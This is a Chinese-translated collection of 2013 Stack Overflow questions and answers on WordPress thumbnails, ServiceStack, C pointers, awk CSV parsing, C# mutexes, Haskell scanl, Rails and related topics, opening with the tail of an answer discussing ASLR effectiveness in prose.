
> 赞同：1
> 
> 时间：2013-04-19T19:57:38.870

首先，我有点惊讶你不需要将选项传递`-z execstack`给编译器来获取 shellcode 来执行`exit(1)`.

此外，我猜您使用的是 32 位机器，因为您没有通过选项`-m32`来`gcc`获取 32 位代码。

最后，我确实运行了你的程序但没有成功（我等了几秒钟以上）。

所以，我对你的结论有点怀疑（除非你运行的是一个非常奇特的 Linux 系统或者可能很幸运）。

无论如何，有两件主要的事情你没有提到：

1.  提供无限利用窗口的错误非常罕见。
2.  大多数现代系统在 amd64（64 位）处理器上运行，这大大降低了命中 nop 区域的可能性。

您可以查看ASLR 维基百科页面上的“ [ASLR 有效性”部分。](http://en.wikipedia.org/wiki/Address_space_layout_randomization#Effectiveness)

# php - wordpress 中的照片大小问题

> ID：16110594
> 
> 赞同：0
> 
> 时间：2013-04-19T17:47:46.527
> 
> 标签：php, image, wordpress

嗨，我无法将缩略图显示为图像的实际大小。

这是我的代码：

```
<div class="property_photo">
        <?php if (has_post_thumbnail($property->ID)){
            echo get_the_post_thumbnail(
            $property->ID,
            array(300,220),
            array('class' => 'post_thumbnail')
            );
            }
        ?>
    </div> 
```

CSS：

```
.property_photo {
 float:left; 
 max-width:300px;
 min-height:220px;
} 
```

函数.php：

```
add_theme_support('post-thumbnails'); // ENABLES POST THUMBNAILS
add_image_size( 'post-thumbnails', 300, 220, true );
add_image_size( 'bones-thumb-600', 600, 150, true );
add_image_size( 'bones-thumb-300', 300, 220, true ); 
```

它显示正确的宽度但不是正确的高度。

提前致谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-19T18:13:14.667

使用字符串关键字而不是 2 项数组：

`get_the_post_thumbnail( $property->ID, 'post-thumbnails', array('class' => 'post_thumbnail') )`

说明：使用数组将调整原始图像的大小，使用字符串将呈现硬裁剪的拇指

[http://codex.wordpress.org/Function_Reference/get_the_post_thumbnail](http://codex.wordpress.org/Function_Reference/get_the_post_thumbnail)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-19T19:29:29.347

步骤1。将此函数粘贴到您的 function.php 文件中

```
function vt_resize( $attach_id = null, $img_url = null, $width, $height, $crop = false ) {

    // this is an attachment, so we have the ID
    if ( $attach_id ) {

        $image_src = wp_get_attachment_image_src( $attach_id, 'full' );
        $file_path = get_attached_file( $attach_id );

    // this is not an attachment, let's use the image url
    } else if ( $img_url ) {

        $file_path = parse_url( $img_url );
        $file_path = ltrim( $file_path['path'], '/' );
        //$file_path = rtrim( ABSPATH, '/' ).$file_path['path'];

        $orig_size = getimagesize( $file_path );

        $image_src[0] = $img_url;
        $image_src[1] = $orig_size[0];
        $image_src[2] = $orig_size[1];
    }

    $file_info = pathinfo( $file_path );
    $extension = '.'. $file_info['extension'];

    // the image path without the extension
    $no_ext_path = $file_info['dirname'].'/'.$file_info['filename'];

    $cropped_img_path = $no_ext_path.'-'.$width.'x'.$height.$extension;

    // checking if the file size is larger than the target size
    // if it is smaller or the same size, stop right here and return
    if ( $image_src[1] > $width || $image_src[2] > $height ) {

        // the file is larger, check if the resized version already exists (for crop = true but will also work for crop = false if the sizes match)
        if ( file_exists( $cropped_img_path ) ) {

            $cropped_img_url = str_replace( basename( $image_src[0] ), basename( $cropped_img_path ), $image_src[0] );

            $vt_image = array (
                'url' => $cropped_img_url,
                'width' => $width,
                'height' => $height
            );

            return $vt_image;
        }

        // crop = false
        if ( $crop == false ) {

            // calculate the size proportionaly
            $proportional_size = wp_constrain_dimensions( $image_src[1], $image_src[2], $width, $height );
            $resized_img_path = $no_ext_path.'-'.$proportional_size[0].'x'.$proportional_size[1].$extension;            

            // checking if the file already exists
            if ( file_exists( $resized_img_path ) ) {

                $resized_img_url = str_replace( basename( $image_src[0] ), basename( $resized_img_path ), $image_src[0] );

                $vt_image = array (
                    'url' => $resized_img_url,
                    'width' => $new_img_size[0],
                    'height' => $new_img_size[1]
                );

                return $vt_image;
            }
        }

        // no cached files - let's finally resize it
        $new_img_path = image_resize( $file_path, $width, $height, $crop );
        $new_img_size = getimagesize( $new_img_path );
        $new_img = str_replace( basename( $image_src[0] ), basename( $new_img_path ), $image_src[0] );

        // resized output
        $vt_image = array (
            'url' => $new_img,
            'width' => $new_img_size[0],
            'height' => $new_img_size[1]
        );

        return $vt_image;
    }

    // default output - without resizing
    $vt_image = array (
        'url' => $image_src[0],
        'width' => $image_src[1],
        'height' => $image_src[2]
    );

    return $vt_image;
} 
```

第 2 步是在您的页面中显示。为此使用这个

```
<a href="<?php the_permalink() ?>" rel="bookmark" alt="Read Moare about <?php the_title(); ?>" title="Read Moare about <?php the_title(); ?>" >
              <?php 
 $thumb = get_post_thumbnail_id(); 
 $image = vt_resize( $thumb,'' , 515, 700, true );
 ?>
              <img src="<?php echo $image[url]; ?>" width="<?php echo $image[width]; ?>" height="<?php echo $image[height]; ?>" /> </a> 
```

..其中 515 和 700 是大小。您可以根据需要更改此设置！

# asp.net-mvc-4 - 与 MVC 并行运行 ServiceStack

> ID：16110598
> 
> 赞同：3
> 
> 时间：2013-04-19T17:48:07.953
> 
> 标签：asp.net-mvc-4, servicestack

我设法与 MVC4 并排运行 ServiceStack，但我仍然有一个小问题，希望有人能帮助我。

通过 VS2012 执行调试会话时，一切正常 - 浏览器打开并且第一页加载良好。但是当刷新页面并尝试访问时`http://localhost:62322/Content/site.css`，会显示以下错误：

```
Handler for Request not found: 

Request.ApplicationPath: /
Request.CurrentExecutionFilePath: /Content/site.css
Request.FilePath: /Content/site.css
Request.HttpMethod: GET
Request.MapPath('~'): D:\All\Projects\ExampleProject\trunk\ExampleProject\ExampleProject\
Request.Path: /Content/site.css
Request.PathInfo: 
Request.ResolvedPathInfo: /Content/site.css
Request.PhysicalPath: D:\All\Projects\ExampleProject\trunk\ExampleProject\ExampleProject\Content\site.css
Request.PhysicalApplicationPath: D:\All\Projects\ExampleProject\trunk\ExampleProject\ExampleProject\
Request.QueryString: 
Request.RawUrl: /Content/site.css
Request.Url.AbsoluteUri: http://localhost:62322/Content/site.css
Request.Url.AbsolutePath: /Content/site.css
Request.Url.Fragment: 
Request.Url.Host: localhost
Request.Url.LocalPath: /Content/site.css
Request.Url.Port: 62322
Request.Url.Query: 
Request.Url.Scheme: http
Request.Url.Segments: System.String[]
App.IsIntegratedPipeline: False
App.WebHostPhysicalPath: D:\All\Projects\ExampleProject\trunk\ExampleProject\ExampleProject
App.DefaultHandler: DefaultHttpHandler
App.DebugLastHandlerArgs: GET|/Content/site.css|D:\All\Projects\ExampleProject\trunk\ExampleProject\ExampleProject\Content\site.css 
```

但是如果我删除 AppHost.cs 中的以下代码行，一切正常，并且总是找到 site.css 的处理程序：

```
SetConfig(new EndpointHostConfig { ServiceStackHandlerFactoryPath = "api", DefaultContentType = ContentType.Json }); 
```

我对该项目的要求是使用 ServiceStack 包装通过浏览器（所有控制器）的任何调用以及对 /api 的调用，这些调用应由 ServiceStack 服务处理。我按照此处的说明进行操作： [https](https://github.com/ServiceStack/ServiceStack/wiki/Run-servicestack-side-by-side-with-another-web-framework) ://github.com/ServiceStack/ServiceStack/wiki/Run-servicestack-side-by-side-with-another-web-framework ，我的 web.config 如下所示：

```
<system.web>
    <!--...-->
        <httpHandlers>
          <add path="*" type="ServiceStack.WebHost.Endpoints.ServiceStackHttpHandlerFactory, ServiceStack" verb="*" />
        </httpHandlers>
    <!--...-->
</system.web>
<location path="api">
    <system.web>
      <httpHandlers>
        <add path="*" type="ServiceStack.WebHost.Endpoints.ServiceStackHttpHandlerFactory, ServiceStack" verb="*" />
      </httpHandlers>
    </system.web>
    <!-- Required for IIS 7.0 -->
    <system.webServer>
      <modules runAllManagedModulesForAllRequests="true" />
      <validation validateIntegratedModeConfiguration="false" />
      <handlers>
        <add path="*" name="ServiceStack.Factory" type="ServiceStack.WebHost.Endpoints.ServiceStackHttpHandlerFactory, ServiceStack" verb="*" preCondition="integratedMode" resourceType="Unspecified" allowPathInfo="true" />
      </handlers>
    </system.webServer>
</location> 
```

有谁知道为什么 site.css 的处理程序有时能找到，有时不能？此外，如果我在配置 ServiceStack 以包装我的整个服务器时犯了错误，请指点我。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-22T22:09:07.373

从您尝试做的事情来看，我建议您从一个普通的 ASP.NET Web 应用程序开始。设置项目后，您可以使用 NuGet

```
Install-Package ServiceStack.Host.AspNet 
```

或者只是按照[这里](http://www.servicestack.net/ServiceStack.Hello/)的配置。这样做会在根路径 / 运行 ServiceStack。

在您上面的设置中，您不需要这条线......

```
SetConfig(new EndpointHostConfig { ServiceStackHandlerFactoryPath = "api", DefaultContentType = ContentType.Json }); 
```

添加它是告诉 ServiceStack 仅处理包含`'/api'`您不想要的路径的请求。

# c - 为什么 VS 在编译 strcpy 函数中使用的未初始化字符串时会抛出错误？

> ID：16110599
> 
> 赞同：0
> 
> 时间：2013-04-19T17:48:08.883
> 
> 标签：c, string, pointers, struct, strcpy

我很想知道为什么下面的代码片段适用于某些 C 编译器而不是其他的。我的教授可以在 DevC++ 中编译此代码，我也可以，但我无法在 VS 2010 中编译此代码。有什么想法吗？VS 说 a.word 有一个错误的指针。我假设 VS 疯了，因为我没有初始化 a.word，但为什么代码在 DevC++ 中编译和工作？我必须添加 a.word=""; 在 strcpy 之前，然后它在 VS 中工作，但我再次很想知道为什么。谢谢

```
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
struct foo{  int num;
             char* word;
             struct foo *ptr;};
int main() {
        struct foo a;
        a.num = 5; a.ptr = &a;
        strcpy(a.word,"whichword");
} 
```

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2013-04-19T17:50:36.870

`a.word`是一个未初始化的指针 ( `char*`) 而不是未初始化的字符串 ( `char[n]`)。这是完全不同的：

```
char buf[20];  /* Uninitialized string, backed by memory, */
char* s;       /* but an unitialized `char*` is pointing to some random */
               /* memory address. */
               /* Any attempt to access it is undefined behaviour. */ 
```

> 我必须添加 a.word=""; 在 strcpy 之前，然后它在 VS 中工作

这也将导致未定义的行为，因为`a.word`指向不允许修改的字符串文字。

唯一的两种解决方案是更改`word`为固定大小的数组或`word`在复制之前动态分配内存。在任何一种情况下，与之关联的内存都`word`必须足够大以存储正在复制的字符串（加上空终止字符）。

# linux - 如何让 awk、cut 等不偷看带引号的字符串中的 FS

> ID：16110601
> 
> 赞同：3
> 
> 时间：2013-04-19T17:48:20.497
> 
> 标签：linux, awk, cut

我有一个输入 CSV 文件，其中包含以下内容：

```
SD-32MM-1001,"100.00",4/11/2012
SD-32MM-1001,"1,000.00",4/12/2012 
```

`postgresql COPY`我需要为其他一些处理管道（ ）取出数值格式。

是否有一个文本过滤器可以将 FS 上的列分开，而不用窥视带引号的字符串？目前我得到：

```
$ tail +2 /tmp/foo.csv|awk -F, '{print NF}'
3
4 
```

同样的部分值`cut`

我必须留在 Linux 上。

谢谢。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-19T18:05:27.600

GNU awk 可以处理这个你只需要设置`FPAT`来描述你认为的字段：

```
$ awk '{print NF}' FPAT="([^,]+)|(\"[^\"]+\")" file
3
3

$ awk '{print $2}' FPAT="([^,]+)|(\"[^\"]+\")" file
"100.00"
"1,000.00" 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-19T17:56:00.227

Using a [perl](/questions/tagged/perl "show questions tagged 'perl'") script and a proper parser (the good solution: awk & cut are not suited for this particular needs):

```
use strict; use warnings;

use Text::CSV;

my @rows;
my $csv = Text::CSV->new ()
                or die "Cannot use CSV: ".Text::CSV->error_diag ();

open my $fh, "<:encoding(utf8)", "/tmp/file.csv" or die "$!";
while ( my $row = $csv->getline( $fh ) ) {

    # printing line 2, last field
    $. == 2 and print $row->[-1];
}
$csv->eof or $csv->error_diag();
close $fh; 
```

## Output

```
4/12/2012 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-05-04T21:31:39.647

sudo_O 的建议应该有效——除非你的字段里面有双引号，这可能发生在标准 CSV 数据中，例如。

```
field1,field2,"field,3","field4 ""has some quotes"" in it",field5 
```

要处理这些问题，您可以使用我编写的名为 csvquote 的程序来包装标准 UNIX 命令，如 cut、awk 等，如下所示：

```
csvquote /tmp/foo.csv | tail +2 | awk -F, '{print NF}' 
```

这通过在引用字段中查找逗号并将它们临时替换为 awk 可以安全处理的非打印字符来工作。然后，当您想从字段创建输出时，管道将需要恢复这些逗号：

```
csvquote /tmp/foo.csv | cut -d, -f2 | csvquote -u 
```

你可以在这里找到代码：[https ://github.com/dbro/csvquote](https://github.com/dbro/csvquote)

# c#-4.0 - XmlSchemaInfo.SchemaElement 在使用接收 PVSI 进行验证后为空

> ID：16110603
> 
> 赞同：0
> 
> 时间：2013-04-19T17:48:31.713
> 
> 标签：c#-4.0, linq-to-xml, xsd-validation

我尝试使用已编译（和正确）的架构集并提供验证后架构信息（PVSI）来验证 XDocument：

```
public void ValidateDoc(XDocument doc)
{
    if (doc == null)
        return;

    // _schema is correct filled schema-set
    if (!_schemas.IsCompiled)
        _schemas.Compile();

    try
    {
        _validated.Clear();
        if (_schemas.Count > 0)
            doc.Validate(_schemas, OnValidate, true);

        foreach (var item in _validated)
        {
            var si = item.GetSchemaInfo();
            // si exists and si.Validity is set to XmlSchemaValidity.Invalid but si.SchemaElement and si.SchemaAttribute is null
        }
    }
    catch (XmlSchemaException err)
    {
        _log.FatalException(string.Format("Failed to validate document {0} [{1}, {2}] ", doc.BaseUri, err.LineNumber, err.LinePosition), err);
    }
}

protected virtual void OnValidate(object sender, ValidationEventArgs args)
{
    if (ValidationEvent != null)
        ValidationEvent(sender, args);

    var xobj = sender as XObject;
    if (xobj != null)
    {
        xobj.AddAnnotation(new XmlErrInfo(args));
        if (xobj is XElement)
            _validated.Add((XElement)xobj);
    }
} 
```

但是 .GetSchemaInfo().SchemaElement 为空（其他字段也为空），而不是指向已编译的模式元素（我需要在相同元素的未来验证场景中使用它）。它有什么问题或我做错了什么？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-21T14:16:21.390

好吧，如果您想访问`SchemaElement`有效元素的 ，我可以理解您的方法，但您似乎想访问`SchemaElement`报告给事件处理程序的那些无效元素。我不认为这些属性是为无效节点填充的。

# javascript - 警报如何使javascript中断？我可以用代码来做吗？

> ID：16110605
> 
> 赞同：3
> 
> 时间：2013-04-19T17:48:36.863
> 
> 标签：javascript, jquery

我正在处理一种围绕 4000 个元素的“大”JSON 对象，它为不同的方法传递，我想`div`用显示该过程的文本更新标签。

但出于某种奇怪的原因（刚刚在 Firefox 和 Chrome 中测试过），它们不会使用文本更新 DOM 对象。

```
$("#estatusBar").text(_item.Centro_de_trabajo); 
```

两者都喜欢继续计算所有数据和其他过程，而无需花时间更新文本。但是，如果我只是`Alert("")`在循环中编写一个代码，然后在 chrome 中单击“选定框”说忽略所有其他警报，则 chrome 突然开始更新文本。

所以我在想我是否可以用某种代码“暂停”计算以停止和更新 DOM 元素，然后继续进行另一个过程？

这是可能的还是这种奇怪行为的替代方法？

- 编辑 -

这是循环的代码

```
 $.each(plantillas, function(_index, _item){
        updateBar(_item.Centro_de_trabajo);
        calculateItem(_item,_index);
        a.push("<div class='blockee'><ul>"+ /*temp.join("")*/ t(_item) +"</ul></div>");
    }); 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-19T17:56:39.337

No you cannot do what alert does. This limitation is really annoying in some cases but if your problem is just a progress for a single long computation then the solution is simple.

Instead of doing alll the records in one single loop break the computation in "small enough" chunks and then do something like

```
function doit()
{
    processBlockOfRecords();
    updateProgressBar();
    if (!finished()) {
        setTimeout(doit, 0);
    }
}

setTimeout(doit, 0); 
```

With this approach is also simple to add an "abort" button to stop the computation.

In your example the loop is

```
$.each(plantillas, function(_index, _item){
    updateBar(_item.Centro_de_trabajo);
    calculateItem(_item,_index);
    a.push("<div class='blockee'><ul>"+ /*temp.join("")*/ t(_item) +"</ul></div>");
}); 
```

so the computation could be split with (untested)

```
function processRecords(plantillas, completion_callback) {
    var processed = 0;
    var result = [];

    function doit() {
        // Process up to 20 records at a time
        for (var i=0; i<20 && processed<plantillas.length; i++) {
            calculateItem(plantillas[processed], processed);
            result.push("<div class='blockee'><ul>" +
                        t(plantillas[processed]) +
                        "</ul></div>");
            processed++;
        }

        // Progress bar update
        updateProgress(processed, plantillas.length);

        if (processed < plantillas.length) {
            // Not finished, schedule another block
            setTimeout(doit, 0);
        } else {
            // Processing complete... inform caller
            if (completion_callback) completion_callback(result);
        }
    }

    // Schedule computation start
    setTimeout(doit, 0);
} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-19T17:52:24.030

您可以尝试使用[web workers](https://developer.mozilla.org/en-US/docs/DOM/Using_web_workers)，将计算推迟到后台，这应该可以帮助您。网络工作者被设计来做这件事（将大量计算推送到后台线程）。但是，这可能不适用于所有浏览器。您主要关心的是 IE，并且只有 IE 10 支持它：

![在此处输入图像描述](https://i.stack.imgur.com/8JIce.png)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-04-19T17:53:19.407

你想要一些版本的等待或暂停或睡眠或类似的 javascript 是吗？

唯一的方法是与

```
window.setTimeout() 
```

您可以使用它暂停任何功能。

检查这篇文章也可能会有所帮助： [Sleep/Pause/Wait in Javascript](https://stackoverflow.com/questions/7854820/sleep-pause-wait-in-javascript)

# ruby-on-rails - Rails - 将参数传递给表单

> ID：16110612
> 
> 赞同：2
> 
> 时间：2013-04-19T17:48:56.293
> 
> 标签：ruby-on-rails, forms, params

我有以下情况：

在应用程序中有客户和项目。一个客户可以有很多项目，一个项目属于一个客户。我用脚手架创造了一切，并且关系有效。我可以在客户端上创建一个参考项目。

但现在我想在客户端视图中创建一个按钮，该按钮链接到“新项目表单”并将当前客户端作为参数传递。因此，客户应在新项目的表格中预先设置。

我试图通过传递参数来做到这一点，如下所示：

```
<%= link_to "New Project", new_project_path(:project => { :client_id => @client.id } ), :class => 'btn btn-primary' %> 
```

但我不明白我现在如何在新项目表单中使用参数 :client_id 。或者可能有其他方法可以直接在项目控制器中执行此操作。

感谢您的帮助！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-19T17:59:54.017

您可能应该使用可能具有[多态关联](http://railscasts.com/episodes/154-polymorphic-association-revised?autoplay=true)设置的[嵌套资源。](http://railscasts.com/episodes/139-nested-resources)这样你就不需要传递client_id。研究这两个主题应该会有很大帮助。

如果设置了客户端，这是我使用简单表单隐藏下拉菜单的内容。如果你正确地建立了你的关系，剩下的就是 Rails 的魔法。

```
<% unless @client %>
  <%= f.association :client, prompt: 'Select a client...', label_method: lambda { |client| "#{client.first_name} #{client.middle_name} #{client.last_name}" } %>
<% end %> 
```

# c# - 互斥锁无法正常工作

> ID：16110614
> 
> 赞同：0
> 
> 时间：2013-04-19T17:49:02.060
> 
> 标签：c#, mutex

所以这段代码在 program.cs 中，应该检查连接是否可用以及是否有另一个实例已经在运行。如果有，消息框会通知用户，并询问他是否确定要打开应用程序。接下来是问题：我打开应用程序，然后再次打开它，消息框显示但没有任何反应。我重复这些过程，仅在 4-5 次后才有效。然后，如果我再次打开，它会打开 2 个实例。

```
static void Main()
    { 
        Application.EnableVisualStyles();
        Application.SetCompatibleTextRenderingDefault(false);
        SqlConnection con123 = new SqlConnection(con123.Metoda());
        Mutex mut = null;
        try
        {
            mut = Mutex.OpenExisting("Tray minimizer");
        }
        catch
        {

        }

        if (mut == null)
        {

            mut = new Mutex(true, "Tray minimizer");
            Application.Run(new Form1());

            //Tell GC not to destroy mutex until the application is running and
            //release the mutex when application exits.
            GC.KeepAlive(mut);
            mut.ReleaseMutex();
        }
        else
        {
            //The mutex existed so exit
            mut.Close();

                DialogResult result = MessageBox.Show("AApplication is already working!Do you want to reopen it?", "Caution!", MessageBoxButtons.OKCancel);

                if (result == DialogResult.OK)
                {

                    foreach (Process p in System.Diagnostics.Process.GetProcessesByName("Name of application"))
                    {
                        try
                        {

                            p.Kill();
                          //  p.WaitForExit(); // possibly with a timeout

                            Application.Run(new Form1());
                        }
                        catch (Win32Exception winException)
                        {
                            // process was terminating or can't be terminated - deal with it
                        }
                        catch (InvalidOperationException invalidException)
                        {
                            // process has already exited - might be able to let this one go
                        }
                    }

                }
                //if (result == DialogResult.Cancel)
                //{

                //}

            }

            try
            {
                con123.Open();
                con123.Close();
            }
            catch
            {

                MessageBox.Show("Cant connect to server!!!", "Error!");
                Application.Exit();
            } 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-19T18:31:15.837

我会做更多类似的事情：

```
bool mutexCreated = true;
using (Mutex mutex = new Mutex(true, "eCS", out mutexCreated))
{
    if (mutexCreated)
    {
        Application.EnableVisualStyles();
        Application.SetCompatibleTextRenderingDefault(false);
        SqlConnection con123 = new SqlConnection(con123.Metoda());

        Application.Run(new Form1());
    }
    else
    {
        DialogResult result = 
            MessageBox.Show("AApplication is already working!Do you want to reopen it?", "Caution!",
                                                MessageBoxButtons.OKCancel);

        if (result == DialogResult.OK)
        {
            foreach (Process p in System.Diagnostics.Process.GetProcessesByName("Name of application"))
            {
                try
                {
                    p.Kill();

                    Application.Run(new Form1());
                }
                catch (Win32Exception winException)
                {
                    // process was terminating or can't be terminated - deal with it
                }
                catch (InvalidOperationException invalidException)
                {
                    // process has already exited - might be able to let this one go
                }
            }

        }
    }

    try
    {
        con123.Open();
        con123.Close();
    }
    catch
    {

        MessageBox.Show("Cant connect to server!!!", "Error!");
        Application.Exit();
    }
} 
```

您的版本的问题是互斥锁可能在不适当的时间被收集。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-19T18:33:51.617

1.  一旦您最终进入“互斥锁存在”路径，您就永远不会释放互斥锁。您只需杀死任何其他进程并再次启动您的应用程序，但永远不会提供在新应用程序结束时释放互斥锁的方法。

2.  您正在循环中启动您的应用程序`foreach (Process)`，这意味着如果已经有多个进程正在运行（可能都带有消息框），您将为每个进程启动您的应用程序。

3.  这也意味着如果您实际上没有找到要杀死的另一个进程，您将不会启动您的应用程序。

您的`else`案例应该类似于以下伪代码：

```
dialogResult = MessageBox(...);
if (dialogResult == OK)
{
    foreach (var p in ...)
    {
        // Todo: make sure you do not kill the current process!
        p.Kill();
    }

    // now run the application
    Application.Run(new Form1());
    // now release the mutex
    mut.Release();
}
else
{
    mut.Close();
} 
```

该伪代码仍然需要一些异常处理，以确保在发生异常时正确释放互斥锁。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-04-19T18:34:35.010

这能解决你的问题吗？我没有使用`OpenExisting`，它没有文档保证`null`在失败时返回，而是使用`Mutex`构造函数`out bool`来确定互斥体是否已创建或是否已经存在。启动应用程序并对其进行任何操作（根据我所看到的部分猜测）被移到与创建互斥锁或关闭现有实例相关的所有内容之下。

现在的步骤如下：

1.  `runApp`将变量初始化为真
2.  尝试创建`Mutex`
3.  检查是否`Mutex`已创建（尚不存在）
    *   如果`Mutex`没有创建，它已经存在
        *   询问用户是否要退出，等待互斥量可用（表示强制退出现有应用实例完成）
        *   如果他们不想退出，请设置`runApp`为`false`
4.  检查`runApp`标志是否仍然为真

    *   如果是真的，运行应用程序。之后返回（表单退出），尝试连接

        请注意，这可能有一个错误，我不知道您是否打算像在应用程序中那样阻止。

5.  释放互斥锁

    ```
    Application.EnableVisualStyles();
    Application.SetCompatibleTextRenderingDefault(false);
    SqlConnection con123 = new SqlConnection(con123.Metoda());
    string ProgramName = "Tray minimizer.exe";
    bool mutCreated = false;
    Mutex mut = new Mutex(true, ProgramName, out mutCreated);
    bool runApp = true;
    if (!mutCreated)
    {
        DialogResult result = MessageBox.Show("Application is already working! Do you want to reopen it?", "Caution!", MessageBoxButtons.OKCancel);

        if (result == DialogResult.OK)
        {
            foreach (Process p in System.Diagnostics.Process.GetProcessesByName(ProgramName))
            {
                try
                {
                    p.Kill();
                }
                catch { }
            }
            mut.WaitOne(); // Wait for ownership of the mutex to be released when the OS cleans up after the process being killed
        }
        else
        {
            runApp = false;
        }
    }

    if (runApp)
    {
        Application.Run(new Form1());

        try
        {
            con123.Open();
            con123.Close();
        }
        catch
        {

            MessageBox.Show("Cant connect to server!!!", "Error!");
            Application.Exit();
        }

        mut.ReleaseMutex();
    } 
    ```

# .htaccess - 使用 htaccess 如何将 index.html 指定为服务器上同时包含 index.html 和 index.php 的主页？

> ID：16110615
> 
> 赞同：0
> 
> 时间：2013-04-19T17:49:06.577
> 
> 标签：.htaccess

正如我的标题所说，使用 htaccess 如何将 index.html 指定为在服务器上同时具有 index.html 和 index.php 的主页？我在服务器上有一个常规的基本 html 站点，我想开始在一个当然使用 php 的 joomla 站点上工作。如果我在 index.php 中输入地址以允许我开始安装 joomla，我不想重定向 php。我只想在输入域名时自动转到index.html。我希望我说得通。谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-19T19:09:19.763

您用于[`DirectoryIndex`](http://httpd.apache.org/docs/2.2/mod/mod_dir.html#directoryindex)指定仅在请求目录时显示哪个文件

```
DirectoryIndex index.html 
```

# variables - Haskell 中的累加器

> ID：16110616
> 
> 赞同：0
> 
> 时间：2013-04-19T17:49:12.920
> 
> 标签：variables, haskell

我有这个功能：

```
map(\x -> if (isLetter x) then (update exp (Literal x) "") else Epsilon) "a+b+c+" where exp = Epsilon 
```

我希望对于 map 函数的每一步，我的变量 exp 不是 Epsilon，而是与前一步保持相同，我还想保留中间结果列表。有人能帮我吗 ？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-19T18:02:00.780

由于您想保留中间结果，因此我收集到的意图的直接翻译是

```
scanl (\exp x -> if (isLetter x) then update exp (Literal x) "" else Epsilon) Epsilon "a+b+c+" 
```

的类型`scanl`是

```
Prelude> :t scanl
scanl :: (a -> b -> a) -> a -> [b] -> [a] 
```

第一个参数是组合当前“状态”和下一个列表元素的函数，第二个参数是初始“状态”。因此，上面使用您提供的函数更新“状态”，调整为采用两个参数。

我不确定您是否真的想将累加器重置`Epsilon`为每个非字母，如果不是，您可能需要更改组合功能

```
\exp x -> if (isLetter x) then update exp (Literal x) "" else exp 
```

为非字母保留累加器的旧值。

# java - 将 DefaultCategoryDataset 值写入文件

> ID：16110617
> 
> 赞同：0
> 
> 时间：2013-04-19T17:49:22.087
> 
> 标签：java, jfreechart

我在我的程序中使用 jfree 图表。我`DefaultCategoryDataset`用来保存我想在图表中显示的数据。现在我想写`DefaultCategoryDataset`的值包括列、行和值的列表。有谁知道我该怎么做？？

```
frame = new JFrame();
frame.setBounds(50, 50, 1135, 1029);

DefaultCategoryDataset dataSet = new DefaultCategoryDataset(); 
for (int i = 0; i < observedEWMAs.size(); i++) {
 dataSet.addValue(observedEWMAs.get(i), "observed" + title,
          ((Integer) (i + 1)).toString()); 
//here i want to write data set fo file 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-19T18:22:20.803

使用[此处](http://www.jfree.org/jfreechart/api/javadoc/src-html/org/jfree/chart/demo/BarChartDemo1.html#line.97)[`DefaultCategoryDataset`](http://www.jfree.org/jfreechart/api/javadoc/org/jfree/data/category/DefaultCategoryDataset.html)定义的 in [`BarChartDemo1`](http://www.jfree.org/jfreechart/api/javadoc/org/jfree/chart/demo/BarChartDemo1.html)，以下代码会产生预期的输出：

代码：

```
for (int r = 0; r < dataset.getRowCount(); r++) {
    String series = (String) dataset.getRowKey(r);
    for (int c = 0; c < dataset.getColumnCount(); c++) {
        System.out.println(series
            + ", " + dataset.getColumnKey(c)
            + ", " + dataset.getValue(r, c));
    }
} 
```

安慰：

```
一、第一类，1.0
一、2类、4.0
一、3类、3.0
一、4类、5.0
一、5类、5.0
二、1类、5.0
二、类别2、7.0
二、3类、6.0
二、4类、8.0
二、5类、4.0
三、1类、4.0
三、类别2、3.0
三、3类，2.0
三、4类、3.0
三、5类、6.0

```

# ruby-on-rails - Rails 使用 id 作为参数通过 rest post 添加记录

> ID：16110620
> 
> 赞同：0
> 
> 时间：2013-04-19T17:49:29.313
> 
> 标签：ruby-on-rails

我们正在开发一个与现有应用程序集成的 Rails 应用程序。我们使用 Mule 和 restful 接口在两个应用程序之间移动数据。

我们有一些代码表，例如从旧应用程序到新应用程序的优先级和类型。如果我们可以为两个应用程序使用相同的 ID 号，移动使用这些 ID 作为外键的数据记录会更容易。

有没有办法让 ID 成为通过 Rails RESTful 接口更新的字段之一？

我希望这个工作：

```
http://localhost:5000/types?type[id]=315&type[typecode]=test 
```

这是 POST 的类型控制器：

```
 # POST /types
# POST /types.json
def create
  @type = Type.new(params[:type])

  respond_to do |format|
    if @type.save
      format.html { redirect_to @type, notice: 'Type was successfully created.' }
      format.json { render json: @type, status: :created, location: @type }
      format.xml { render xml: @type, status: :created, location: @type }
    else
      format.html { render action: "new" }
      format.json { render json: @type.errors, status: :unprocessable_entity }
      format.xml { render xml: @type.errors, status: :unprocessable_entity }
    end
  end
end 
```

现在，如果我发布那个 URL，它会创建一个 typecode=test 的新类型记录，但是 id 是下一个可用的 id，而不是我在 URL 中提供的那个。

谢谢您的帮助！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-19T18:43:18.293

你试过这个吗？

```
 @type = Type.new(params[:type])
      if params[:type][:id]
          @type.id = params[:type][:id]
      end
      @type.save 
```

# jquery - jQuery，如何在几个单选按钮后立即选择下一个 div？

> ID：16110622
> 
> 赞同：1
> 
> 时间：2013-04-19T17:49:29.597
> 
> 标签：jquery, jquery-selectors

我有一个包含几组单选按钮和几个输入文本的表单，在每组之后，无论是单选按钮还是文本，都有一个按钮来保存每组的更改。

我想要做的是，使用 jQuery，为 onchange 事件添加一个处理程序，以便启用每组收音机（和文本）的下一个按钮。

html是这样的：

```
Antig.<input type="text" name="anosAntiguedad" id="anosAntiguedad" >

